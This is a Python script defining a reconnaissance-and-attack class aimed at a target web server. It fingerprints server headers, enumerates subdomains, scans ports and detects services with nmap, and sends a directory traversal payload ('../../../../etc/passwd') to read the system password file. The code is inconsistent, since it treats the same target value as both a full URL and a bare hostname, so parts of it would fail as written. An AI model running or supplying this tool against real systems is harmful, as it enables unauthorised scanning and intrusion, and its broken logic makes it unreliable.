import requests
import socket
import nmap
import subprocess

class ReconnaissanceAdvanced:
    def __init__(self, target_url, headers=None):
        self.target_url = target_url
        self.headers = headers if headers else {'User-Agent': 'Mozilla/5.0'}

    def perform_fingerprinting(self):
        """
        Perform fingerprinting to identify the server's software, version, and CMS.
        """
        try:
            response = requests.get(self.target_url, headers=self.headers)
            server = response.headers.get('Server', 'Unknown')
            x_powered_by = response.headers.get('X-Powered-By', 'Unknown')
            print(f"Server: {server}")
            print(f"X-Powered-By: {x_powered_by}")
        except requests.exceptions.RequestException as e:
            print(f"Error during fingerprinting: {e}")

    def subdomain_enumeration(self):
        """
        Attempt to find subdomains of the target using a simple DNS lookup.
        """
        subdomains = ['www', 'api', 'dev', 'test', 'admin']
        for sub in subdomains:
            subdomain = f"{sub}.{self.target_url}"
            try:
                ip = socket.gethostbyname(subdomain)
                print(f"Subdomain found: {subdomain} -> {ip}")
            except socket.gaierror:
                print(f"Subdomain not found: {subdomain}")

    def directory_traversal(self, payload):
        """
        Perform a directory traversal attack to find hidden files and directories.
        """
        url = f"{self.target_url}?{payload}"
        
        try:
            response = requests.get(url, headers=self.headers)
            if "root" in response.text or "/etc/passwd" in response.text:
                print(f"Directory Traversal successful with payload: {payload}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"Error during Directory Traversal: {e}")
        return False

    def port_scanning(self, target_ip):
        """
        Perform a simple port scan on the target IP.
        """
        scanner = nmap.PortScanner()
        print(f"Scanning ports on {target_ip}...")
        try:
            scanner.scan(target_ip, '1-1024')  # Scan ports 1 to 1024
            for host in scanner.all_hosts():
                for protocol in scanner[host].all_protocols():
                    lport = scanner[host][protocol].keys()
                    for port in lport:
                        print(f"Port {port} is open")
        except Exception as e:
            print(f"Error during port scanning: {e}")

    def service_identification(self, target_ip, port):
        """
        Try to identify services running on a specific port.
        """
        try:
            result = subprocess.check_output(['nmap', '-sV', '-p', str(port), target_ip])
            print(f"Service identification result: {result.decode()}")
        except subprocess.CalledProcessError as e:
            print(f"Error during service identification: {e}")

    def execute_reconnaissance(self):
        """
        Run all reconnaissance activities on the target.
        """
        print(f"Initiating reconnaissance on {self.target_url}")
        
        # Perform Fingerprinting
        self.perform_fingerprinting()

        # Subdomain Enumeration
        self.subdomain_enumeration()

        # Directory Traversal
        traversal_payload = "file=../../../../etc/passwd"
        self.directory_traversal(traversal_payload)

        # Port Scanning (example IP, replace with actual)
        target_ip = socket.gethostbyname(self.target_url)
        self.port_scanning(target_ip)

        # Service Identification
        self.service_identification(target_ip, 80)  # Example port 80
